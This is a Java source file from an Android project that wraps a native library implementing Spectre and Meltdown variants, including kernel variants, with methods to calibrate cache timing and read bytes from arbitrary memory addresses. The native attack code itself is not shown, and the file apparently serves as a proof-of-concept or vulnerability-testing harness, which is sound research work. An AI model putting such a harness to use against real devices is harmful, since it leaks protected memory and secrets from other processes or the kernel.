package android.spectre;

import android.util.Log;

/**
 * Created by paulo on 18/01/18.
 */

public class Spectre implements AutoCloseable {
    public static final String TAG = Spectre.class.getSimpleName();

    static {
        System.loadLibrary("spectre");
        Log.i(TAG, "Native library loaded");
    }

    private long native_ptr;
    private Variant variant;

    private Spectre(Variant variant) {
        this.variant = variant;
        this.native_ptr = nativeCreate(variant.ordinal());
    }

    @Override
    public void close() throws Exception {
        if (this.native_ptr != 0) {
            this.nativeDestroy(this.native_ptr);
            this.native_ptr = 0;
        }
    }

    @Override
    protected void finalize() throws Throwable {
        close();
    }

    public enum Variant {
        DirectAccess("Direct Memory Access"),
        BoundsCheckBypass("v1 -- Spectre"),
        FunctionsBoundsCheckBypass("v1b -- Function Array"),
        RogueDataCacheLoad("v3 -- Meltdown"),
        BoundsCheckBypassKernel("Kernel v1 -- Spectre" ),
        FunctionsBoundsCheckBypassKernel("Kernel v1b -- Function Array" );

        public final String description;

        Variant(String description) {
            this.description = description;
        }

        public Spectre build() {
            return new Spectre(this);
        }
    };

    public static native long nativeCreate(int variant);
    public static native void nativeDestroy(long instance);

    public static native void nativeReadPtr(long instance, long address, int length, Callback callback);
    public static native void nativeReadBuf(long instance, byte[] data, Callback callback);

    public static native int nativeCalibrateTiming(long instance, int count, int[] hit_times, int[] miss_times);


    public void read(long ptr, int len, Callback callback) {
        nativeReadPtr(this.native_ptr, ptr, len, callback);
    }
    public void read(byte[] data, Callback callback, Variant... variants) {
        nativeReadBuf(this.native_ptr, data, callback);
    }


    public int calibrateTiming() {
        return calibrateTiming(64);
    }
    public int calibrateTiming(int count) {
        return calibrateTiming(count, null, null);
    }
    public int calibrateTiming(int count, int[] hit_times, int[] miss_times) {
        return nativeCalibrateTiming(native_ptr, count, hit_times, miss_times);
    }

    @Override
    public String toString() {
        return this.variant.toString();
    }

    public interface Callback {
        public void onByte(int offset, long pointer, byte bestGuess, int bestScore, byte secondGuess, int secondScore);
    }
}
